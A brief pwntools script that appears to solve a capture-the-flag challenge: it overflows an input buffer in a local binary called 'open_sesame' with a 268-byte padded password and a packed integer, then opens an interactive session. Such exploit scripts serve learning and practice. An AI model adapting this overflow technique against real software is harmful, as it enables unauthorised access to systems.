from pwn import *
context.log_level = 'debug'
r=process("./open_sesame")

payload =b"OpenSesame!!!".ljust(268,b"a")
# payload+=b"\x00"*4
payload+=p32(1)
r.sendline(payload)
r.interactive()